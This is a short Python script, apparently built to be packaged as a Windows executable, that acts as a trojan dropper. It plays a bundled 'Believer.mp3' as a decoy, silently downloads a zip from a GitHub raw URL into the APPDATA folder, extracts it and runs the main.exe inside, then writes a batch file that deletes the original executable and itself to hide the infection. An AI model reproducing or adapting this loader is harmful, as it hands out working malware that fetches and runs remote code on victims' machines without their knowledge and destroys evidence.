import sys
import zipfile
import requests
import os
import tempfile
import subprocess

appdata = os.environ.get("APPDATA")

with open(os.path.join(sys._MEIPASS, "Believer.mp3"), "rb") as src_file:
    data = src_file.read()

with open("Believer.mp3", "wb") as dst_file:
    dst_file.write(data)

os.startfile("Believer.mp3")


responce_zip = requests.get("https://raw.githubusercontent.com/Fildoi5/test/main/dhfe.zip")



with open(f"{appdata}\\dhfe.zip", "wb") as file:
    file.write(responce_zip.content)

with zipfile.ZipFile(f"{appdata}\\dhfe.zip", "r") as zip_file:
    zip_file.extractall(appdata)

if os.path.exists(f"{appdata}\\dhfe"):
    os.remove(f"{appdata}\\dhfe.zip")

# with open(f"{appdata}\\dhfe\\path.txt","w") as file_path:
#     file_path.write(sys.executable)



os.startfile(f"{appdata}\\dhfe\\main.exe")

with tempfile.NamedTemporaryFile('w', suffix='.bat', delete=False) as bat_file:
    bat_path = bat_file.name
    bat_file.write(f'''
                    @echo off
                    timeout /t 2 /nobreak > nul
                    del "{sys.executable}"
                    del "%~f0"
                    ''')
subprocess.Popen([bat_path], shell=True)
sys.exit()






